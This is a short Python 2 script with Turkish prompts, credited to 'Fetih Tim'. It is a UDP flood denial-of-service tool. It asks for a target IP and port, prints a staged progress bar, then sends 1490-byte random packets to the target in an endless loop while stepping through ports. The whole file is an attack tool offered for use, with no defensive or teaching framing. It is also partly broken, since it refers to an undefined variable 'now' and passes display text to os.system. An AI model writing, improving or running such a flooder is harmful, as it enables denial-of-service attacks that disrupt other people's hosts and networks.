import sys
import os
import time
import socket
import random
from datetime import datetime
simdi = datetime.now()
saat = now.hour
dakika = now.minute
gun = now.day
ay = now.month
yil = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
os.system("DDoS Saldırısı Başlatılıyor")
print()
print("Fetih Tim Tarafından")
print()
ip = raw_input("Karşı IP  : ")
port = input("Port        : ")
os.system("clear")
os.system("DDoS Başlatılıyor")
print("[                    ] 0% ")
time.sleep(10)
print("[+++++               ] 25%")
time.sleep(10)
print("[++++++++++          ] 50%")
time.sleep(10)
print("[+++++++++++++++     ] 75%")
time.sleep(10)
print("[++++++++++++++++++++] 100%")
time.sleep(5)
sent = 0
while 1:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("%s Paketi Üzerinden %s Portuna Gönderildi:%s" % (sent, ip, port))
     if port == 65534:
       port = 1